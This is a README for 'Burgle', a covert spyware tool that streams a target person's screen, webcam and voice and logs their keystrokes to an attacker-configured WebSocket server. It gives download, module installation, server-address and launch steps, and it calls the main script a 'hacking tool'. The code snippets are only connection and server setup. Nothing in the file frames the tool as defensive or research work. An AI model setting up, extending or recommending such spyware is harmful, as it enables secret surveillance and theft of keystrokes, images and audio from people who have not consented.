# Burgle

"Burgle" is a program that allows for monitoring of an individual. It is characterized by streaming the target computer's screen, webcam, the person's voice, and keylogs.

## Features

- 💻 Display Capture: Observe what the other person is doing on their computer.
- 📹 Webcam Stream: Observe what the other person is doing in front of their computer.
- 🎙️ Voice Stream: Observe what the other person is saying in front of their computer.
- 🔐 Key log: Observe what the other person is searching for on their computer.

## Installation
To install burgle, follow these simple steps:

1. ⬇️ Download: Start [download][downloadtip] .
2. 📁 Install Moudules: ``npm i`` with install python moudules ([Python Moudule List][list]).
3. ⚒️ Fix Server Address: 
    - js:
        ```js
        socket = new WebSocket('ws://your-server-address:your-port');
        ```

        **__[link][link1]__**

    - Python:
        ```py 
        server = websockets.serve(module-name, "your-server-address", 8765)
        ```

        **__[link][link2]__**
4. 🏃‍♀️ Start Burgle: 
    
    - start hacking tool:
        ```py 
        python main.py
        ```
    - start web server:
        ```ps 
        npm start
        ```

## Option
- Configure web server access permissions:
    - Individual:
    
        ```js
        const server = app.listen(port, 'localhost', () => {
            const port = server.address().port;
            console.log(`Server is running on port ${port}`);
        });
        ```
    - Global:
    
        ```js
        const server = app.listen(port, '0.0.0.0', () => {
            const port = server.address().port;
            console.log(`Server is running on port ${port}`);
        });
        ```

[downloadtip]: ./DownloadTip.md
[list]: ./requirements.txt
[link1]: ./server/public/js/
[link2]: ./hack/